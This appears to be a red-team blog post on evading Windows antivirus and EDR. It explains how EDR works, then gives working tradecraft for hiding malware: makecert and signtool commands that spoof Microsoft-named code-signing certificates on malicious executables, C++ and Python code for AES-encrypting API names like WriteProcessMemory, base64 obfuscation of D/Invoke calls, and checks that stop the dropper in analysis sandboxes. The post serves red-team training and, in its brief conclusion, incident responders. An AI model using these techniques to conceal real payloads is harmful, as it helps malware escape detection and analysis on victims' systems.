---
title: "Windows Evasion " 
layout: "post"
---

In modern Windows enterprise environment we often encounter lots of obstacles, which try to detect and stop our sneaky tools and techniques. 
Endpoint protection agents (AV, IDS/IPS, EDR, etc.) are getting better and better at this, so this requires an extended effort in finding a way into the system and staying undetected during post-exploitation activities.
Detection tecnology and endpoint security solutions aims to prevent, detect and stop our malware from being either stored on disk or executed directly from memory. 

Security products among other things use static security analysis to detect malware at rest (file on disk) this is primarely based on searching for specific bytes pattenrs in the files. 
This has been widely used and abused during the years so this is why to tend to say that signature detections is dead. It's not dead it's just an annoying aspect we have to deal to as red teamers.


<p align="center">
  <img src="/assets/posts/2021-03-01-Windows-Evasion/av-edr1.JPG">
</p>

During engagements, often times you want to remain in memory as much as possible. 
In some edge cases however, you might need to drop something to disk. 
This is often the case when leveraging a persistence mechanism for example.
Quite often I’ve seen inexperienced red team(er)s make the mistake of dropping things to disk without any regards of operational security (OPSEC)


This would normally include antivirus, EDR agents and sensonrs including Sysmon.  All of these solutions uses same or similar method for monitoring operating system activities such as network, 
process, file activities and interestegly many of these techniques are also being used by our malware.  This is why also EDR are kind of malware as they inject DLL, hook API's, they monitor user activities. 

Nowadays, looking at the user and kernel space with resocurce available. Typically an EDR has two components one running in userland usualy as a dedicated services
and the other running on kernel land. Kernel component monitor system activities like disk operations , network communications and more importantly it registers kernel callbacks for specifici system events occurence (such as NewProcess Creations) 

<p align="center">
  <img src="/assets/posts/2021-03-01-Windows-Evasion/userland.JPG">
</p>

Windows kernel allows to register callbacks for many events but most EDR and AV solutins use the one for new process and thread creation and terminations, loading images from disks, registry access. 
 
Additionally EDR can also consume Eevent Trace for Windows (ETW) events,  which is a very powerfull logging and tracing capabilities of windows OS. 
All of these allow us to have a broad view of events happening on the system. 
However if you want so see what is going on within a particluar process we need to inject our code into these processes. So once the EDR detecs a 
new process it will inject it's monitoring DLL which sets hooks on specific windows API functions so that we they are called the EDR can log all the data assosiacted with this system calls like. 

Typically hooks are set on the ntdll module as this is the last user space code before transit into the kernel.
Lastly these logs are stored and analyzed either in house or in the cloud; monitor can be extended to other infrastructure components like logs firewalls routers switcehs oprxies 
, these allow you to focus on better detection as you are not focusing on the single machine but on the entire network flow.  
 
<p align="center">
  <img src="/assets/posts/2021-03-01-Windows-Evasion/av-edr2.JPG">
</p>


We as security operator we can do a lot to evade these controls as we can target hooks in our process we can evade signature, we can attack userland & kernel components and so on.


## File Entropy & properties 

Remember the importance of obfuscation & encryption to our malware to hide from security products such as AV/EDR's. the drowback of this technique is that we are going to change our binary's entropy! 


Entropy is measurament of reandomness. Heuristics analysys used in security product calculate entropy of a file or part of the file to detect encrypted data inside. 


We can use helium to visualize file's entropy. This is important to remember when we store our payload in the different PE sections. 


<p align="center">
  <img src="/assets/posts/2021-03-01-Windows-Evasion/entropy.JPG">
</p>


In the vast majority of cases, all legitimate binaries on your computer will have some sort of item properties attached to them, let us take FireFox for example:

<p align="center">
  <img src="/assets/posts/2021-03-01-Windows-Evasion/chrome.JPG">
</p>

It should not come as a surprise that your own compiled payloads are pretty obviously standing out when checking them, and obviously they will also not be signed by default.

This makes it pretty much a dead giveaway to analysts that this is not a binary that should live on the system.
For C# this can be accomplish directly from within Visual Studio. In Visual Studio, right click your project, select properties and press the Assembly Information button.
From there you should be able to put in whatever you like. Alternatively you could edit the AssemblyInfo.cs file directly as well

For C++ the workflow on visual studio is slightly different as we will need to add a resource file by clicking on Resource Files -> add -> new item -> resource file.

<p align="center">
  <img src="/assets/posts/2021-03-01-Windows-Evasion/vsresource.JPG">
</p>

You will land in a new Resource view browser where you can again right click -> add resource select version.
From here you land in a new version file where you can start filling out informations about your dropper. 




## File and code binary Signing


You can sign code using a code signing certificate. However, when doing this that would also mean that everything you sign, is immediately traced back to you. 
So we can use fake code signing as well. The tool I like to use for this is https://github.com/Tylous/Limelighter

This tool allows you to sign software using either a real code signing cert or fake sign it with an arbitrary domain.

<p align="center">
  <img src="/assets/posts/2021-03-01-Windows-Evasion/lime.JPG">
</p>


1) Self signed certificate

Furthermore, we can also use the following command to sign our malicous executable with a Microsoft signed certificate. 
Bear is mind this is mostly to pass behind automatic tools. An educated human eye will recognize the spoofed signature applied.

```cpp
Self signed CA:
makecert -r -pe -n "CN = Microsoft Root Certificate Authority 2015,O = Microsoft Corporation,L = Redmond,S = Washington,C = US" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv CA.pvk CA.cer

Self signed cert:
makecert -pe -n "CN=Microsoft Windows Production PCA 2015,O = Microsoft Corporation,L = Redmond,S = Washington,C = US" -a sha256 -cy end -sky signature -eku 1.3.6.1.5.5.7.3.3,1.3.6.1.4.1.311.10.3.24,1.3.6.1.4.1.311.10.3.6 -ic CA.cer -iv CA.pvk -sv SPC.pvk SPC.cer

Convert to PFX:
pvk2pfx -pvk SPC.pvk -spc SPC.cer -pfx SPC.pfx

Sign binary:
signtool sign /v /f SPC.pfx <executable>
``` 

<p align="center">
  <img src="/assets/posts/2021-03-01-Windows-Evasion/signedImplant.JPG">
</p>


## String and functions obfuscation

#### 1) AES String Encryption 

First of all we need the c++ function to apply AES encryption/decryption 

```cpp
//AES ENC
int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}
```

We then need to declare our encptyted WIN API function as a pointers.

```cpp
  BOOL (WINAPI * pWriteProcessMemory)(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);
```

```cpp
unsigned char sWriteProcessMemory[] = { 0xac, 0x40, 0xc4, 0xf9, 0x13, .... };
``` 

To generate the encrypted function use the imported python scritp (add link to github)

```py
c=aesenc("WriteProcessMemory\x00","addyourkey")
print('payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in c) + ' };')
payload[] = { 0x6, 0xea, 0x85, 0x3e, ..... };
```


We will then decrypt the function pointer before executing the WriteProcessMemory Win API function. 

```cpp
AESDecrypt((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), sWriteProcessMemory);
```


#### 2) Change of delegate names

In order to evade defender it is possible to change delegate names and implement base64 encoding of API strings

Intended D/Invoke way:
```cpp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
```

Obfuscated way:
```cpp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate IntPtr OpPr(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
```

#### 3) Change of API method pointer query:

Intended D/Invoke way:
```cpp
var pointer = Generic.GetLibraryAddress("kernel32.dll", "OpenProcess");
```
Obfuscated base64 way:
```cpp
string op = "T3BlblByb2Nlc3M="; // echo -n "OpenProcess" | base64
byte[] openc = System.Convert.FromBase64String(op);
string opdec = Encoding.UTF8.GetString(openc);
var pointer = Generic.GetLibraryAddress("kernel32.dll", opdec);
```




## Anti analysis defenses

3) `Anti analysis defenses`

In order to protect our malware from being analyzed by security engenieer we will add some simple defenses tecniques used to protect our custom dropper. The objectives here, most of the time, is being able to detect if the malware is being opened in a __VirtualEnvironment__ like virtual box or any vistualization software. 

```cpp
// check CPU
SYSTEM_INFO systemInfo;
GetSystemInfo(&systemInfo);
DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
if (numberOfProcessors < 2) return 0;
```
__IMG 1:__ Checking CPU

```cpp
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	GlobalMemoryStatusEx(&memoryStatus);
	DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
	if (RAMMB < 2048) return 0;
```

__IMG 2:__ Checking RAM

```	cpp
	ULONGLONG uptime = GetTickCount64() / 1000;
	if (uptime < 1200) return 0; //20 minutes
```
__IMG 3:__ Checking UpTime


## Conclusion

I hope this blogpost gives you a bit of an understanding that simply compiling stuff and dropping to disk, hoping for the best, is not really the best approach from a red team perspective.

From a blue team perspective, if you are doing IR, it is always a good thing to check these certs and information for their validity, and if they are missing, this should already give you an indication that you might wanna dig deeper.

Some other noteworthy projects to mention are:

Resource Hacker which allows you to modify your resources post compilation.


